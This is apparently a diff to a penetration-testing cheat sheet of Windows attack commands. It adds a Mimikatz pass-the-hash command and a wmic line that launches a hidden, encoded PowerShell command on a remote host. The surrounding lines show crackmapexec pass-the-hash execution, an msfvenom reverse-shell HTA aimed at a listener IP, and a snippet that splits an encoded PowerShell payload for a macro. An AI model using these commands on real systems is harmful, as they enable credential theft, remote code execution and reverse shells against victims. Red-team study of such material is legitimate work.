@@ -18,6 +18,10 @@ crackmapexec smb --exec-method atexec <host> -u <user> -d <domain> -H <hash> -x 
 crackmapexec smb --exec-method mmcexec <host> -u <user> -d <domain> -H <hash> -x <command>
 
 WmiExec.ps1 -ComputerName "<target>" -Command "Get-ChildItem C:\"
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe"'
+
+wmic /node:"<target>" /user:"<domain\user>" /password:"<pass>" process call create "powershell -Sta -Nop -Window Hidden -EncodedCommand <b64_cmd>"
 ```
 
 ### WinRM
@@ -320,7 +324,6 @@ run -j
 msfvenom -p windows/shell_reverse_tcp LHOST="<listener_ip>" LPORT=443 -f hta-psh > revshell.hta
 
 # python split macro
-
 str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
 n = 50
 for i in range(0, len(str), n):
